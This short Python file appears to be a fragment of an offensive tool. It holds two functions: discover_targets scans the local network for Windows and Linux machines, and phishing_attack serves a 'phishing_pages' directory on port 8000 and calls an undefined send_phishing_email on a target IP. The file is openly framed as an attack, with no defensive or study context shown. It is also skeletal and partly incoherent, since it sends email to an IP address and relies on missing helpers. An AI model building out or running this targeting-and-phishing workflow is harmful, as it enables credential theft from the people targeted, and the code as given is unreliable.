import subprocess
import re
from utils.network_utils import scan_network

def discover_targets():
    targets = []
    # Scan local network for devices
    network_scan = scan_network()
    for device in network_scan:
        if device['os'] == 'Windows' or device['os'] == 'Linux':
            targets.append(device)
    return targets

def phishing_attack(target_ip):
    # Set up a simple HTTP server to host phishing page
    subprocess.run(["python3", "-m", "http.server", "8000", "--directory", "phishing_pages"])
    # Send phishing email to target
    send_phishing_email(target_ip)